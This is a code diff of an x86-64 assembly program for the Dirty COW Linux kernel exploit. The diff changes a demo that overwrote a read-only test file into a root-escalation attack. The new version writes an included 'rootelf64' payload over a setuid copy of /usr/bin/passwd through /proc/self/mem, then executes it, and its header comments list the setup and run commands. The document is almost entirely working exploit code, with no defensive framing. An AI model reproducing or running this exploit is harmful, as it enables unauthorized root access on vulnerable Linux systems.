@@ -1,14 +1,14 @@
 ;( create readonly file and check )
-;> sudo cat 'hello world, this is the original content' > test.txt
-;> sudo chmod -w test.txt
+;> sudo cp /usr/bin/passwd /usr/bin/passwd0
+;> sudo chmod -w +s /usr/bin/passwd0
 ;> sudo -k
-;> ls -l test.txt
-;> cat test.txt
+;> ls -l /usr/bin/passwd*
 ;( compile )
 ;> fasm ./main.fasm ./dirtycow
 ;( and execute )
 ;> ./dirtycow
-;> cat test.txt
+;> /usr/bin/passwd
+;> /usr/bin/passwd0
 
 format                                  ELF64                                   executable
 use64
@@ -23,6 +23,7 @@ sys0ret                                 equ                                     
 sys1ret                                 equ                                     rdx
 MMAP_fPrivate                           =                                       0x02
 MMAP_pReadable                          =                                       0x01
+sys_read                                =                                       0
 sys_write                               =                                       1
 sys_open                                =                                       2
 sys_fstat                               =                                       5
@@ -31,7 +32,10 @@ sys_mmap                                =                                       
 sys_madvise                             =                                       28
 sys_nanosleep                           =                                       35
 sys_clone                               =                                       56
+sys_execve                              =                                       59
 sys_exit                                =                                       60
+sys_setuid                              =                                       105
+sys_exit_group                          =                                       231
 null                                    =                                       0
 __qword__                               =                                       8
 page_size                               =                                       4096
@@ -39,7 +43,8 @@ file_modeR                              =                                       
 file_modeW                              =                                       0x00000001
 file_modeRW                             =                                       0x00000002
 MADV_DONTNEED                           =                                       4
-
+MICROSECONDS                            =                                       1000
+STDOUT                                  =                                       1
 macro null                              register
 {
   xor                                   register,                               register
@@ -83,20 +88,27 @@ macro nanosleep                         sec,                                    
 
 segment                                 executable                              readable                                writeable
   _start_:
-    lea                                 sys0arg,                                [ fDirtycow ]
-    lea                                 sys1arg,                                [ msgDirtycow ]
-    mov                                 sys2arg,                                msgDirtycow.size
+    lea                                 sys0arg,                                [ fPasswd ]
+    lea                                 sys1arg,                                [ rootelf64 ]
+    mov                                 sys2arg,                                rootelf64.fsize
     call                                dirtycow
+    lea                                 rax,                                    [ fPasswd ]
+    lea                                 sys2arg,                                [ cmdFinal ]
+    mov                                 qword [ cmd0 ],                         rax
+    lea                                 sys0arg,                                [ fPasswd ]
+    lea                                 sys1arg,                                [ cmd0 ]
+    sys_call                            sys_execve
     null                                sys0arg
-    sys_call                            sys_exit
+    sys_call                            sys_exit_group
   include                               'dirtycow.fasm'
-  fDirtycow                             db                                      './test.txt', 0
-  msgDirtycow                           db                                      '<this should not be here!>', 10
-  msgDirtycow.size                      =                                       $ - msgDirtycow
+  include                               'rootelf64.fdat'
+  fPasswd                               db                                      '/usr/bin/passwd0', 0
   dirtycow.fmem                         db                                      '/proc/self/mem', 0
+  cmd0                                  dq                                      null
+  cmdFinal                              dq                                      0
   time.s                                rq                                      1
   time.n                                rq                                      1
-  dirtycow.childs                       rq                                      1
+  dirtycow.childs                       rq                                      2
   dirtycow.filename                     rq                                      1
   dirtycow.filedesc                     rq                                      1
   dirtycow.payload                      rq                                      1
